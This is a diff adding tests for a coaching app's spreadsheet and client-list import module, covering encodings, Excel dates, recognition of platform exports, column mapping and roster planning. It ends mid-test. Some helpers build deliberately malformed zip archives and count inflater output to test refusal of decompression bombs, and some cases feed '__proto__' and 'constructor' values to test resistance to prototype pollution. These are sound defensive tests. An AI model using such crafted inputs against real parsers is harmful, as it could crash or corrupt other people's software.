@@ -92,6 +92,9 @@
 <script src="clubs.js"></script>
 <script src="health.js"></script>
 <script src="switch-kit.js"></script>
+<script src="import-lib-xlsx.js"></script><!-- IMPORTS: the vendored readers, loaded here for the real-file tests (the app loads them only when a file needs them) -->
+<script src="import-lib-fflate.js"></script>
+<script src="import-core.js"></script>
 <script src="voice.js"></script>
 <script src="video-review.js"></script>
 <script src="meetday.js"></script>
@@ -113,6 +116,7 @@
 <script src="coach-report-ui.js"></script>
 <script src="coach-app.js"></script>
 <script src="coach-program.js"></script>
+<script src="notify.js"></script>
 <script>
 /* ===========================================================
    Tiny zero-dependency test framework
@@ -3430,6 +3434,646 @@ test('switch kit: a realistic 300-row history', () => {
 });
 
 /* ===========================================================
+   Imports (import-core.js): the intake that takes any file a
+   coach has. Fixtures come from published headers only; where
+   a header's spelling or a row's values aren't published, the
+   test name says "assumed".
+   =========================================================== */
+group('imports (import-core.js)');
+const IC = window.ImportCore;
+const IM_TODAY = '2026-10-28';
+const imBytes = (arr) => new Uint8Array(arr);
+const imUtf8 = (s) => new TextEncoder().encode(s);
+const imTable = (csv, name) => IC.tablesFromText(csv, name || 'file.csv')[0];
+const imTC_HEAD = 'First Name,Last Name,Email,Compliance Score,Total Workouts Completed,Birthday,Location,Timezone,Phone Number,Client Type,Client State,Height,Weight,Unit Preference,Gender';
+const imCRX_HEAD = 'Client ID,Client Name,Client Email,Coach,Coach Email,Status,Start Date,Archive Date,Height (cm),Weight (kg),Sex,Birthday,Phone Number,Timezone,Location,Address,Emergency Contact,T-Shirt Size,Referred By,Exercise Sessions Completed,Lifestyle Rx\'s Completed,Highest Streak,Tags,Last Consultation,Synced with Stripe,Product,Plan,Card Brand,Card Last 4,Monthly Revenue,Payment Status';
+// A zip built by hand, so a test can make it lie. entries: [{ name, data (bytes or text), method (8 by default,
+// 0 stored), comp (the bytes written: data deflated, or data), size / csize (the sizes it declares: the real
+// ones by default), flags, lx / cx (local / central extra field bytes), offset (where the directory says it
+// is) }]. opts: { onDisk, total (the end record's two counts), cdAt (where it says the directory starts), more
+// (that many extra directory entries pointing at the first file) }.
+const imLE = (v, n) => { const out = []; for (let i = 0; i < n; i++) { out.push(v % 256); v = Math.floor(v / 256); } return out; };
+function imZip(entries, opts) {
+  opts = opts || {};
+  const enc = new TextEncoder(), out = [], central = [];
+  const put = (arr, list) => { for (let i = 0; i < list.length; i++) arr.push(list[i]); };
+  const recs = entries.map(e => {
+    const name = Array.from(enc.encode(e.name));
+    const raw = typeof e.data === 'string' ? enc.encode(e.data) : (e.data || new Uint8Array(0));
+    const method = e.method == null ? 8 : e.method;
+    const comp = e.comp || (method === 8 ? fflate.deflateSync(raw) : raw);
+    const r = { name, method, comp, size: e.size == null ? raw.length : e.size, csize: e.csize == null ? comp.length : e.csize, flags: e.flags || 0, lx: e.lx || [], cx: e.cx || [], at: out.length };
+    put(out, imLE(0x04034b50, 4)); put(out, imLE(20, 2)); put(out, imLE(r.flags, 2)); put(out, imLE(method, 2)); put(out, imLE(0, 4));
+    put(out, imLE(0, 4)); put(out, imLE(r.csize, 4)); put(out, imLE(r.size, 4)); put(out, imLE(name.length, 2)); put(out, imLE(r.lx.length, 2));
+    put(out, name); put(out, r.lx); put(out, comp);
+    r.offset = e.offset == null ? r.at : e.offset;
+    return r;
+  });
+  const cdAt = out.length;
+  const cd = (r) => {
+    put(central, imLE(0x02014b50, 4)); put(central, imLE(20, 2)); put(central, imLE(20, 2)); put(central, imLE(r.flags, 2)); put(central, imLE(r.method, 2)); put(central, imLE(0, 4));
+    put(central, imLE(0, 4)); put(central, imLE(r.csize, 4)); put(central, imLE(r.size, 4)); put(central, imLE(r.name.length, 2)); put(central, imLE(r.cx.length, 2)); put(central, imLE(0, 2));
+    put(central, imLE(0, 2)); put(central, imLE(0, 2)); put(central, imLE(0, 4)); put(central, imLE(r.offset, 4)); put(central, r.name); put(central, r.cx);
+  };
+  recs.forEach(cd);
+  for (let k = 0; k < (opts.more || 0); k++) cd(Object.assign({}, recs[0], { name: Array.from(enc.encode('f' + (k + 1) + '.csv')) }));
+  put(out, central);
+  const n = recs.length + (opts.more || 0);
+  put(out, imLE(0x06054b50, 4)); put(out, imLE(0, 2)); put(out, imLE(0, 2)); put(out, imLE(opts.onDisk == null ? n : opts.onDisk, 2)); put(out, imLE(opts.total == null ? n : opts.total, 2));
+  put(out, imLE(central.length, 4)); put(out, imLE(opts.cdAt == null ? cdAt : opts.cdAt, 4)); put(out, imLE(0, 2));
+  return new Uint8Array(out);
+}
+// A ZIP64 extra field (type 1): an uncompressed and a compressed size.
+const imZip64 = (usz, csz) => [1, 0, 16, 0].concat(imLE(usz, 8), imLE(csz, 8));
+// Reading it must be refused with this code, in words for the coach.
+function imRefused(read, code) {
+  try { read(); } catch (e) { eq(e.code, code, String(e.message)); assert(e.user && e.message.length > 20, 'worded for the coach: ' + e.message); return; }
+  throw new Error('read a file it should refuse (' + code + ')');
+}
+// fflate's inflater with what it gives out counted (imOut.n): a bomb must stop long before its end.
+const imOut = { n: 0 };
+function imCounting(fn) {
+  const realF = window.fflate;
+  window.fflate = Object.assign({}, realF, { Inflate: function (cb) { const inner = new realF.Inflate((c, f) => { imOut.n += c.length; cb(c, f); }); this.push = (d, f) => inner.push(d, f); } });
+  try { fn(); } finally { window.fflate = realF; }
+}
+test('imports: text in any encoding (UTF-8 with a BOM, UTF-16 "Unicode text", Windows-1252)', () => {
+  let r = IC.decodeBytes(imBytes([0xEF, 0xBB, 0xBF, 0x44, 0x61, 0x74, 0x65]));
+  eq(r.text, 'Date'); eq(r.encoding, 'utf-8');
+  r = IC.decodeBytes(imBytes([0xFF, 0xFE, 0x44, 0, 0x61, 0, 0x09, 0, 0xE9, 0]));
+  eq(r.text, 'Da\té'); eq(r.encoding, 'utf-16le');
+  r = IC.decodeBytes(imBytes([0x44, 0, 0x61, 0, 0x74, 0, 0x65, 0, 0x0A, 0, 0x31, 0]));
+  eq(r.text, 'Date\n1'); eq(r.encoding, 'utf-16le');                 // no BOM: every other byte is 0
+  r = IC.decodeBytes(imBytes([0x4A, 0x6F, 0x73, 0xE9, 0x2C, 0x31, 0x38, 0x30, 0x80]));
+  eq(r.text, 'José,180€'); eq(r.encoding, 'windows-1252');           // not valid UTF-8
+  eq(IC.decodeBytes(imUtf8('Squat 180×5 @8')).text, 'Squat 180×5 @8');
+});
+test('imports: what a file is, from its first bytes and a zip\'s file list', () => {
+  eq(IC.sniff('p.pdf', imUtf8('%PDF-1.7 ...')), 'pdf');
+  eq(IC.sniff('a.png', imBytes([0x89, 0x50, 0x4E, 0x47, 13, 10, 26, 10])), 'image');
+  eq(IC.sniff('a.jpg', imBytes([0xFF, 0xD8, 0xFF, 0xE0, 0, 0])), 'image');
+  eq(IC.sniff('old.xls', imBytes([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])), 'xls');
+  eq(IC.sniff('w.json', imUtf8('  {"workouts": []}')), 'json');
+  eq(IC.sniff('log.csv', imUtf8('Date,Exercise\n2026-01-01,Squat')), 'text');
+  const zip = (names) => SwitchKit.zip(names.map(n => ({ name: n, text: 'x' })));
+  eq(IC.sniff('book.xlsx', zip(['[Content_Types].xml', 'xl/workbook.xml', 'xl/worksheets/sheet1.xml'])), 'xlsx');
+  eq(IC.sniff('book.ods', zip(['mimetype', 'content.xml', 'META-INF/manifest.xml'])), 'ods');
+  eq(IC.sniff('export.zip', zip(['workouts.csv', 'profile.csv'])), 'zip');
+  eq(IC.sniff('b.numbers', zip(['Index/Document.iwa'])), 'numbers');
+  const list = IC.zipEntries(zip(['workouts.csv', 'profile.csv']));
+  eq(list.map(e => e.name).join(','), 'workouts.csv,profile.csv'); eq(list[0].size, 1);
+  eq(IC.zipEntries(imUtf8('not a zip')).length, 0);
+});
+test('imports: Excel serial dates, the 1900 system and the 1904 system', () => {
+  eq(IC.excelSerialToISO(44927), '2023-01-01'); eq(IC.excelSerialToISO(45658), '2025-01-01');
+  eq(IC.excelSerialToISO(45658.75), '2025-01-01');                    // a time of day doesn't move the date
+  eq(IC.excelSerialToISO(44927 - 1462, true), '2023-01-01');          // 1904 system (old Mac workbooks)
+  eq(IC.excelSerialToISO(61), '1900-03-01'); eq(IC.excelSerialToISO(60), null);   // 29 Feb 1900 never existed
+  eq(IC.excelSerialToISO('abc'), null); eq(IC.excelSerialToISO(-3), null);
+});
+test('imports: workbook cells to text: dates, percents, units in the format, merged cells, formulas without a value', () => {
+  const ws = { '!ref': 'A1:D5', '!merges': [{ s: { r: 1, c: 0 }, e: { r: 3, c: 0 } }],
+    A1: { t: 's', v: 'Date' }, B1: { t: 's', v: 'Exercise' }, C1: { t: 's', v: 'Load' }, D1: { t: 's', v: '%' },
+    A2: { t: 'd', v: new Date(Date.UTC(2026, 2, 2)) }, B2: { t: 's', v: 'Squat' }, C2: { t: 'n', v: 180, z: '0.0 "kg"' }, D2: { t: 'n', v: 0.75, z: '0%' },
+    B3: { t: 's', v: 'Bench' }, C3: { t: 'n', v: 102.49999999999999 }, D3: { t: 'n', v: 0.7, z: '0.0%' },
+    B4: { t: 's', v: 'Row' }, C4: { t: 'n', f: 'C3*0.5' }, D4: { t: 'b', v: true },
+    A5: { t: 'n', v: 46084, z: 'yyyy-mm-dd' }, B5: { t: 'e', v: 7 } };
+  const t = IC.tablesFromWorkbook({ SheetNames: ['Log'], Sheets: { Log: ws }, Workbook: { WBProps: { date1904: false } } })[0];
+  eq(t.name, 'Log'); eq(t.rows.length, 5);
+  eq(t.rows[1].cells.join('|'), '2026-03-02|Squat|180 kg|75%');
+  eq(t.rows[2].cells.join('|'), '2026-03-02|Bench|102.5|70%');       // the merged date fills down
+  eq(t.rows[3].cells[2], ''); eq(t.noValue, 1);                       // a formula with no saved value
+  eq(t.rows[4].cells[0], '2026-03-03'); eq(t.rows[4].cells[1], '');  // a date-formatted serial; an error cell
+  eq(t.rows[1].line, 2);
+  const hidden = IC.tablesFromWorkbook({ SheetNames: ['A', 'B'], Sheets: { A: { '!ref': 'A1:A1', A1: { t: 's', v: 'x' } }, B: { '!ref': 'A1:A1', A1: { t: 's', v: 'y' } } }, Workbook: { Sheets: [{ Hidden: 0 }, { Hidden: 2 }] } });
+  eq(hidden.length, 1);                                               // a very hidden tab isn't offered
+});
+test('imports: the header row is found under a title and blank rows', () => {
+  const t = imTable('Training log 2026,,,\n,,,\nDate,Exercise,Weight,Reps\n2026-01-05,Squat,150,5');
+  const h = IC.findHeader(t.rows);
+  eq(h.index, 1); assert(h.score >= 3, 'scored');                     // splitRows drops the blank row
+  eq(IC.findHeader(imTable('a,b\n1,2').rows).index, 0);
+});
+test('imports: card, payment and revenue columns are dropped the moment a file is read (CoachRx, published headers)', () => {
+  const csv = imCRX_HEAD + '\nc_1,Maya Chen,maya@example.com,Sam Coach,sam@example.com,Active,2025-01-15,,165,63,Female,1996-04-02,555-0101,America/Denver,Denver,1 Main St,Jo 555-0199,M,Instagram,140,12,9,Powerlifting;Online,2026-09-01,TRUE,Online coaching,Monthly,Visa,4242,150,paid';
+  const a = IC.analyse(imTable(csv));
+  ['Synced with Stripe', 'Product', 'Plan', 'Card Brand', 'Card Last 4', 'Monthly Revenue', 'Payment Status'].forEach(h => assert(a.dropped.indexOf(h) >= 0, h + ' dropped'));
+  const all = JSON.stringify(a.table.rows) + JSON.stringify(a.headers) + String(a.table.text || '');
+  assert(all.indexOf('4242') < 0 && all.indexOf('Visa') < 0 && all.indexOf('Monthly') < 0, 'no card or plan data anywhere in the table (only the dropped headers\' names are kept, to say what was left out)');
+  eq(a.headers.length, 24);
+  // A training log keeps a column named Plan: only a client list drops it.
+  const log = IC.analyse(imTable('Date,Exercise,Plan,Weight,Reps\n2026-01-05,Squat,3x5 @8,150,5'));
+  eq(log.dropped.length, 0); eq(log.headers.length, 5);
+});
+test('imports: a TrueCoach client list is recognised (published 15 headers; row values assumed)', () => {
+  const csv = imTC_HEAD + '\nMaya,Chen,maya@example.com,92,140,1996-04-02,Denver,America/Denver,555-0101,Online,active,165,63,metric,female\nLeo,Grant,leo@example.com,75,88,,Austin,America/Chicago,,Online,archived,180,93,imperial,male';
+  const a = IC.analyse(imTable(csv));
+  eq(a.kind, 'roster'); eq(a.layout, 'roster'); eq(a.recognised.id, 'truecoach'); eq(a.recognised.sure, 'published');
+  eq(a.fields[0], 'first'); eq(a.fields[1], 'last'); eq(a.fields[2], 'email'); eq(a.fields[9], 'group'); eq(a.fields[10], 'status');
+  eq(a.unplaced.length, 0);                                           // every published column is known
+  const p = IC.planRoster(a, { athletes: [], invites: [] });
+  eq(p.people.length, 2); eq(p.people[0].name, 'Maya Chen'); eq(p.people[0].email, 'maya@example.com');
+  eq(p.people[0].picked, true); eq(p.people[1].archived, true); eq(p.people[1].picked, false);
+  assert(p.leftOut.indexOf('Phone Number') >= 0 && p.leftOut.indexOf('Birthday') >= 0, 'personal columns left out');
+  assert(JSON.stringify(p.people).indexOf('555-0101') < 0, 'phone numbers are not kept');
+});
+test('imports: a CoachRx client list is recognised, and so is a picked subset of its columns (published headers; weight unit spelling assumed)', () => {
+  const csv = imCRX_HEAD + '\nc_1,Maya Chen,maya@example.com,Sam Coach,sam@example.com,Active,2025-01-15,,165,63,Female,1996-04-02,555-0101,America/Denver,Denver,1 Main St,Jo,M,Instagram,140,12,9,Powerlifting;Online,2026-09-01,TRUE,Online coaching,Monthly,Visa,4242,150,paid\nc_2,Leo Grant,leo@example.com,Sam Coach,sam@example.com,Archived,2024-03-01,2025-06-30,180,93,Male,,,,,,,,,,,,Online,,FALSE,,,,,,';
+  const a = IC.analyse(imTable(csv));
+  eq(a.recognised.id, 'coachrx'); eq(a.kind, 'roster');
+  eq(a.fields[a.headers.indexOf('Coach Email')], 'ignore');           // the coach's email is never the lifter's
+  const p = IC.planRoster(a, { athletes: [], invites: [] });
+  eq(p.people[0].name, 'Maya Chen'); eq(p.people[0].groups.join('|'), 'Powerlifting|Online');
+  eq(p.people[1].archived, true); eq(p.groups.Online, 2); eq(p.statuses.Active, 1);
+  const sub = IC.analyse(imTable('Client Name,Client Email,Highest Streak\nMaya Chen,maya@example.com,9'));
+  eq(sub.recognised.id, 'coachrx');
+});
+test('imports: a Trainerize client list by its documented fields (header spelling assumed)', () => {
+  const a = IC.analyse(imTable('First Name,Last Name,Email,Phone Number,Trainer\nMaya,Chen,maya@example.com,555-0101,Sam Coach'));
+  eq(a.recognised.id, 'trainerize'); eq(a.recognised.sure, 'fields'); eq(a.kind, 'roster');
+  eq(IC.planRoster(a, {}).people[0].name, 'Maya Chen');
+});
+test('imports: a TrainHeroic athlete list by its documented fields (header spelling assumed)', () => {
+  const a = IC.analyse(imTable('Name,Email,Start Date\nMaya Chen,maya@example.com,2025-01-15'));
+  eq(a.recognised.id, 'trainheroic'); eq(a.recognised.sure, 'fields'); eq(a.kind, 'roster');
+  eq(IC.planRoster(a, {}).people[0].email, 'maya@example.com');
+});
+test('imports: a client list from anywhere else goes through the mapper, not a recogniser', () => {
+  const a = IC.analyse(imTable('Athlete,E-mail address,Squad,Favourite lift\nMaya Chen,maya@example.com,Juniors,Bench'));
+  eq(a.recognised, null); eq(a.kind, 'roster');
+  eq(a.fields[0], 'fullName'); eq(a.fields[1], 'email'); eq(a.fields[2], 'group');
+  eq(a.unplaced.join(','), '3');                                     // only the column it can't place asks
+});
+test('imports: Strong, Hevy and FitNotes exports are still recognised through the intake', () => {
+  const strong = imTable('Date;Workout Name;Duration;Exercise Name;Set Order;Weight;Reps;Distance;Seconds;Notes;Workout Notes;RPE\n2025-01-06 07:30:00;Lower;1h;Squat (Barbell);1;315;5;0;0;;;8');
+  let a = IC.analyse(strong); eq(a.recognised.id, 'strong'); eq(a.layout, 'log'); eq(a.kind, 'history');
+  a = IC.analyse(imTable('"title","start_time","end_time","description","exercise_title","superset_id","exercise_notes","set_index","set_type","weight_kg","reps","distance_km","duration_seconds","rpe"\n"Day 1","15 Jan 2025, 08:30","15 Jan 2025, 09:40","","Deadlift (Barbell)","","",1,"normal",220,3,"","",8.5'));
+  eq(a.recognised.id, 'hevy'); eq(a.layout, 'log');
+  a = IC.analyse(imTable('Date,Exercise,Category,Weight (lbs),Reps,Distance,Distance Unit,Time\n2024-11-02,Barbell Squat,Legs,315.0,5,,,'));
+  eq(a.recognised.id, 'fitnotes');
+});
+test('imports: the layout of a sheet: a log, a wide sheet, a program grid, a program table, a client list, a journal', () => {
+  eq(IC.analyse(imTable('Date,Exercise,Weight,Reps,RPE\n2026-01-05,Squat,150,5,8')).layout, 'log');
+  eq(IC.analyse(imTable('Date,Exercise,Set 1 Weight,Set 1 Reps,Set 2 Weight,Set 2 Reps\n2026-01-05,Squat,150,5,155,5')).layout, 'wide');
+  eq(IC.analyse(imTable('Exercise,Week 1,Week 2,Week 3\nSquat,3x5 @7,3x5 @7.5,3x4 @8\nBench,4x6 75%,4x5 77.5%,4x4 80%')).layout, 'grid');
+  eq(IC.analyse(imTable('Week,Day,Exercise,Sets,Reps,Load,RPE\n1,Day 1,Squat,3,5,160,7\n1,Day 1,Bench,4,6,100,7')).layout, 'program');
+  eq(IC.analyse(imTable('Name,Email\nMaya Chen,maya@example.com')).layout, 'roster');
+  const j = IC.tablesFromText('2 Mar 2026\nSquat 180x5 @8, 185x3 @9\nBench 110x5', 'notes.txt')[0];
+  eq(j.kind, 'text'); eq(IC.analyse(j).layout, 'journal');
+  const pt = IC.tablesFromText('Week 1\nDay 1\nSquat 3x5 @7\nBench 4x6 @7', 'program.txt')[0];
+  eq(IC.analyse(pt).layout, 'program-text'); eq(IC.analyse(pt).kind, 'program');
+  eq(IC.analyse(imTable('Colour,Shape\nred,square')).layout, 'unknown');
+});
+test('imports: auto-map places the headers it knows and asks only about the rest', () => {
+  const a = IC.analyse(imTable('Session date,Lift,Load (kg),Reps,RPE,Mood\n2026-01-05,Squat,150,5,8,good'));
+  eq(a.fields.slice(0, 5).join(','), 'date,ex,weight,reps,rpe'); eq(a.unplaced.join(','), '5');
+  const m = IC.historyMap(a); eq(m.date, 0); eq(m.ex, 1); eq(m.weight, 2); eq(m.unit, 'kg');
+  const t = IC.analyse(imTable('Date,Exercise,Target Weight,Target Reps,Target RPE,Actual Weight,Actual Reps,Actual RPE\n2026-01-05,Squat,150,5,8,150,5,8.5'));
+  eq(t.fields.join(','), 'date,ex,tWeight,tReps,tRpe,weight,reps,rpe');
+  const r = IC.analyse(imTable('Date,Exercise,Weight,Reps,RIR,Sets,Notes,Tempo\n2026-01-05,Squat,150,5,2,3,ok,3-1-0'));
+  eq(r.fields.join(','), 'date,ex,weight,reps,rir,sets,note,tempo');
+});
+test('imports: an unknown column is guessed from its values (emails, dates, sets written as text)', () => {
+  const a = IC.analyse(imTable('Who,Contact\nMaya Chen,maya@example.com\nLeo Grant,leo@example.com'));
+  eq(a.fields[1], 'email'); eq(a.guessed[1], true); eq(a.kind, 'roster');
+  const b = IC.analyse(imTable('Trained,Exercise,What I did\n05/01/2026,Squat,150x5 @8\n07/01/2026,Bench,100x5 @8'));
+  eq(b.fields[0], 'date'); eq(b.guessed[0], true); eq(b.fields[2], 'text'); eq(b.layout, 'log');
+});
+test('imports: a file\'s column fingerprint, and the mapping a coach set is used next time (kept by place, never as header text)', () => {
+  // The columns in order (the mapping is kept by place): the same columns in another order are another file.
+  const fp = IC.fingerprint(['Date', 'Lift', 'Kilos', 'Reps']);
+  eq(fp, IC.fingerprint(['date', 'LIFT', 'kilos', 'reps'])); assert(fp !== IC.fingerprint(['Reps', 'Kilos', 'Lift', 'Date']), 'order counts');
+  assert(fp !== IC.fingerprint(['Date', 'Lift', 'Kilos']), 'different columns');
+  const csv = 'Date,Lift,Bar,Reps,Feel\n2026-01-05,Squat,150,5,8';
+  let a = IC.analyse(imTable(csv));
+  eq(a.fields[2], null); eq(a.fields[4], null);
+  const fields = a.fields.slice(); fields[2] = 'weight'; fields[4] = 'rpe';
+  // A map kept the older way (by header text) goes; the new one holds a hash and a field per column, no header text.
+  const maps = IC.rememberMapping({ 'm1-old': { h: { 'maya chen': 'fullName' }, at: '2026-10-01' } }, a.headers, fields, IM_TODAY);
+  eq(Object.keys(maps).length, 1);
+  const kept = JSON.stringify(maps);
+  ['Bar', 'bar', 'Feel', 'feel', 'Lift', 'lift', 'maya'].forEach(w => assert(kept.indexOf(w) < 0, 'no header text kept: ' + kept));
+  eq(maps[IC.fingerprint(a.headers)].f.join(','), 'date,ex,weight,reps,rpe');
+  a = IC.analyse(imTable(csv), { remembered: maps });
+  eq(a.fields[2], 'weight'); eq(a.fields[4], 'rpe'); eq(a.fromMemory, true); eq(a.unplaced.length, 0);
+  // A field that isn't one (a tampered setting) is ignored.
+  const bad = {}; bad[IC.fingerprint(a.headers)] = { f: ['date', 'ex', '__proto__', 'reps', 'constructor'], at: IM_TODAY };
+  a = IC.analyse(imTable(csv), { remembered: bad });
+  eq(a.fields[2], null); eq(a.fields[4], null);
+  let many = {}; for (let i = 0; i < 40; i++) many = IC.rememberMapping(many, ['C' + i, 'Date'], ['ignore', 'date'], '2026-10-' + String(i % 28 + 1).padStart(2, '0'));
+  assert(Object.keys(many).length <= 30, 'remembers 30 files at most');
+});
+test('imports: a wide sheet (Set 1 / Set 2 columns) becomes one row per set', () => {
+  const csv = 'Date,Exercise,Set 1 Weight,Set 1 Reps,Set 1 RPE,Set 2 Weight,Set 2 Reps,Set 2 RPE,Set 3 Weight,Set 3 Reps,Set 3 RPE\n2026-03-02,Squat,180,5,7,180,5,7.5,185,3,8.5\n2026-03-02,Bench,110,5,8,110,5,8.5,,,';
+  const a = IC.analyse(imTable(csv));
+  eq(a.layout, 'wide'); eq(a.wide.length, 3);
+  const long = IC.unpivotWide(a);
+  eq(long.body.length, 5); eq(long.map.weight >= 0 && long.map.reps >= 0 && long.map.rpe >= 0, true);
+  const r = SwitchKit.planHistoryRows(long.body, long.map, { athleteId: 'a1', unit: 'kg', today: IM_TODAY });
+  eq(r.logs.length, 5); eq(r.logs[2].weight, 185); eq(r.logs[2].rpe, 8.5); eq(r.logs[4].rpe, 8.5);
+  // Other spellings: "S1 Reps", "Set 2 - RPE", "Weight 3"; and one cell per set ("Set 1": "140x5 @8").
+  const b = IC.analyse(imTable('Date,Lift,S1 Weight,S1 Reps,Set 2 - Weight,Set 2 - Reps\n2026-03-02,Squat,150,5,155,4'));
+  eq(b.layout, 'wide'); eq(IC.unpivotWide(b).body.length, 2);
+  const c = IC.analyse(imTable('Date,Exercise,Set 1,Set 2,Set 3\n2026-03-02,Squat,140x5 @7,145x5 @8,150x3 @9'));
+  eq(c.layout, 'wide');
+  const lc = IC.unpivotWide(c);
+  eq(SwitchKit.planHistoryRows(lc.body, lc.map, { athleteId: 'a1', today: IM_TODAY }).logs.map(l => l.weight).join(','), '140,145,150');
+});
+test('imports: planned beside done: the done columns are the history, a planned set not done yet is skipped', () => {
+  const csv = 'Date,Exercise,Target Weight,Target Reps,Target RPE,Actual Weight,Actual Reps,Actual RPE\n2026-01-05,Squat,150,5,8,150,5,8.5\n2026-01-05,Bench,100,5,8,100,5,\n2026-01-08,Squat,155,5,8,,,';
+  const a = IC.analyse(imTable(csv));
+  const r = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', unit: 'kg', today: IM_TODAY });
+  eq(r.logs.length, 2); eq(r.logs[0].rpe, 8.5); eq(r.logs[1].rpe, 8); eq(r.rpeFromTarget, 1);   // the bench took its target RPE
+  eq(r.skippedBy['Planned, not done'], 1);
+  // Only planned columns (no done ones): those are the sets.
+  const p = IC.analyse(imTable('Date,Exercise,Planned weight,Planned reps\n2026-01-05,Squat,150,5'));
+  eq(SwitchKit.planHistoryRows(IC.bodyRows(p), IC.historyMap(p), { athleteId: 'a1', today: IM_TODAY }).logs.length, 1);
+});
+test('imports: kg or lb from the header, a unit column, the value, or the coach', () => {
+  const run = (csv, unit) => { const a = IC.analyse(imTable(csv)); return SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', unit: unit || 'kg', today: IM_TODAY }); };
+  close(run('Date,Exercise,Load (lb),Reps\n2026-01-05,Squat,315,5').logs[0].weight, 142.88, 0.01);
+  close(run('Date,Exercise,Weight,Unit,Reps\n2026-01-05,Squat,315,lbs,5\n2026-01-05,Bench,100,kg,5').logs[0].weight, 142.88, 0.01);
+  eq(run('Date,Exercise,Weight,Unit,Reps\n2026-01-05,Squat,315,lbs,5\n2026-01-05,Bench,100,kg,5').logs[1].weight, 100);
+  close(run('Date,Exercise,Weight,Reps\n2026-01-05,Squat,315 lb,5').logs[0].weight, 142.88, 0.01);
+  close(run('Date,Exercise,Weight,Reps\n2026-01-05,Squat,315,5', 'lb').logs[0].weight, 142.88, 0.01);
+  eq(IC.analyse(imTable('Date,Exercise,Weight,Reps\n2026-01-05,Squat,315,5')).unitFromHeader, null);
+  eq(IC.analyse(imTable('Date,Exercise,weight_lbs,reps\n2026-01-05,Squat,315,5')).unitFromHeader, 'lb');
+});
+test('imports: effort as coaches write it in a log: @8, RPE 8.5, 2 RIR, a range, a %, 3x5', () => {
+  const csv = 'Date,Exercise,Weight,Reps,Effort\n2026-01-05,Squat,150,5,@8\n2026-01-05,Squat,150,5,RPE 8.5\n2026-01-05,Bench,100,5,2 RIR\n2026-01-05,Bench,100,5,7-8\n2026-01-05,Row,80,10,';
+  const a = IC.analyse(imTable(csv));
+  eq(a.fields[4], 'rpe');
+  const r = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', today: IM_TODAY });
+  eq(r.logs.map(l => l.rpe).join(','), '8,8.5,8,8,8'); eq(r.noRpeCount, 1);
+  eq(IC.effort('@8').rpe, 8); eq(IC.effort('RPE 8.5').rpe, 8.5); eq(IC.effort('2 RIR').rpe, 8); eq(IC.effort('RIR 1-2').rpe, 8);
+  eq(IC.effort('7-8').rpe, 7); eq(IC.effort('7-8').rpeHi, 8); eq(IC.effort('0.75', { pctColumn: true }).pct, 75); eq(IC.effort('75%').pct, 75);
+  eq(IC.effort('3x5 @8').sets, 3); eq(IC.effort('3x5 @8').reps, 5); eq(IC.effort('easy').rpe, null);
+  // A % with no weight can't be a logged set: it says so.
+  const p = IC.analyse(imTable('Date,Exercise,%1RM,Reps\n2026-01-05,Squat,75%,5'));
+  eq(SwitchKit.planHistoryRows(IC.bodyRows(p), IC.historyMap(p), { athleteId: 'a1', today: IM_TODAY }).skippedBy['A percentage, no weight'], 1);
+});
+test('imports: bodyweight work: "BW" has no load, "BW+20" logs the 20', () => {
+  const a = IC.analyse(imTable('Date,Exercise,Weight,Reps\n2026-01-05,Chin-up,BW,8\n2026-01-05,Dip,BW+20,6\n2026-01-05,Dip,BW + 45 lb,5'));
+  const r = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', unit: 'kg', today: IM_TODAY });
+  eq(r.logs.length, 2); eq(r.logs[0].weight, 20); assert(/Bodyweight \+ 20/.test(r.logs[0].note), r.logs[0].note);
+  close(r.logs[1].weight, 20.41, 0.01); eq(r.skippedBy['Bodyweight, no added load'], 1);
+});
+test('imports: a lifter\'s own import keeps their weigh-ins; a coach\'s skips them', () => {
+  const csv = 'Date,Exercise,Weight,Reps,Bodyweight\n2026-01-05,Squat,150,5,82.4\n2026-01-06,Bodyweight,82.1,\n2026-01-06,Bench,100,5,';
+  const a = IC.analyse(imTable(csv));
+  eq(a.fields[4], 'bw');
+  const mine = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'me', today: IM_TODAY, weighIns: true, existingBw: [{ athleteId: 'me', date: '2026-01-06', weight: 82 }] });
+  eq(mine.logs.length, 2); eq(mine.weighIns.length, 1); eq(mine.weighIns[0].date, '2026-01-05'); eq(mine.weighIns[0].weight, 82.4); eq(mine.bwDupes, 1);
+  const coach = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', today: IM_TODAY });
+  eq(coach.weighIns.length, 0); eq(coach.skippedBy['A weigh-in, not a set'], 1);
+});
+test('imports: the client list plan: names, emails, who is already here, invited, twice in the file, archived', () => {
+  const csv = 'First Name,Last Name,Email,Status\nMaya,Chen,MAYA@example.com,Active\nLeo,Grant,leo@example.com,Active\nAva,Stone,ava@example.com,Active\nmaya,chen,maya@example.com,Active\nNo,Email,,Active\nBad,Email,bad@,Inactive';
+  const a = IC.analyse(imTable(csv));
+  const p = IC.planRoster(a, { athletes: [{ id: 'x', name: 'Leo Grant', email: 'leo@example.com' }], invites: [{ email: 'ava@example.com', used: false }] });
+  eq(p.people.map(x => x.state).join(','), 'new,onRoster,invited,duplicate,noEmail,badEmail');
+  eq(p.people.map(x => x.picked ? 1 : 0).join(''), '100010');
+  eq(p.people[0].email, 'maya@example.com'); eq(p.counts.onRoster, 1); eq(p.counts.invited, 1); eq(p.counts.archived, 1);
+});
+test('imports: a status of "toString", a group of "constructor" or a person called "constructor" is a word like any other', () => {
+  const a = IC.analyse(imTable('Name,Email,Status,Tags\nconstructor,,toString,constructor\nMaya Chen,maya@example.com,toString,__proto__'));
+  const p = IC.planRoster(a, { athletes: [{ id: 'x', name: 'Leo Grant', email: 'leo@example.com' }], invites: [] });
+  eq(p.people[0].state, 'noEmail');                                   // not "on your roster"
+  eq(p.statuses.toString, 2); eq(p.groups.constructor, 1); eq(p.groups.__proto__, 1);
+  eq(Object.keys(p.statuses).join(','), 'toString');
+});
+test('imports: seats left on each plan, with unused invites holding a seat', () => {
+  let s = IC.seats({ limit: 3, athletes: 1, pending: 1 }); eq(s.left, 1); eq(s.used, 2); eq(s.unlimited, false);
